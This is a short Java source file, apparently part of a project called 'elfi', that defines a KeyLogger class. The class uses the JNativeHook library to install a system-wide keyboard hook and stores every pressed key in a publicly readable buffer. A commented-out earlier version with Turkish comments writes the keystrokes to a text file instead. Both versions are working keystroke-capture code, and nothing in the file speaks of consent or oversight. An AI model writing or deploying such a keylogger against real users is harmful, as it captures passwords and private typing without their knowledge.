package com.isee.elfi;

//import com.github.kwhat.jnativehook.GlobalScreen;
//import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
//import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class KeyLogger implements NativeKeyListener {

    private ByteArrayOutputStream byteStream;
    public static byte[] savedBytes;

    public KeyLogger() {
        // Initialize the ByteArrayOutputStream
        byteStream = new ByteArrayOutputStream();
    }

    public byte[] getLogAsBytes() {
        return byteStream.toByteArray(); // Return the captured log as byte array
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            // Convert the key to its byte representation
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
            byte[] keyBytes = keyText.getBytes();

            // Write the bytes to the ByteArrayOutputStream
            byteStream.write(keyBytes);
            byteStream.write('\n'); // Adding newline for each key press (optional)
            savedBytes = byteStream.toByteArray();

            // Optionally, print out the bytes for debugging
            System.out.println(new String(byteStream.toByteArray()));

        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // No action needed on key release
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // No action needed on key typed
    }

    public void startKeyLogger() {
        try {
            GlobalScreen.registerNativeHook(); // Register the global hook
            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Add the listener
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}


//import com.github.kwhat.jnativehook.GlobalScreen;
//import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
//import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
//
//import java.io.BufferedWriter;
//import java.io.FileWriter;
//import java.io.IOException;
//
//public class KeyLogger implements NativeKeyListener {
//
//    private BufferedWriter writer;
//
//    public KeyLogger() {
//        try {
//            writer = new BufferedWriter(new FileWriter("resources/keylog.txt", true)); // Log dosyasını aç
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//    }
//
//    @Override
//    public void nativeKeyPressed(NativeKeyEvent e) {
//        try {
//            // Tuş basıldığında log dosyasına yaz
//            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
//            writer.newLine(); // Yeni bir satıra geç
//            writer.flush(); // Değişiklikleri kaydet
//        } catch (IOException ex) {
//            ex.printStackTrace();
//        }
//    }
//
//    @Override
//    public void nativeKeyReleased(NativeKeyEvent e) {
//        // Tuş serbest bırakıldığında yapılacak işlemler (şu an boş)
//    }
//
//    @Override
//    public void nativeKeyTyped(NativeKeyEvent e) {
//        // Tuş yazıldığında yapılacak işlemler (şu an boş)
//    }
//
//    public static void startKeylogger() {
//        try {
//            GlobalScreen.registerNativeHook(); // Global hook kaydı
//            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Dinleyici ekle
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    public static void main(String[] args) {
//        // Logger'ı başlat
//        startKeylogger();
//    }
//}
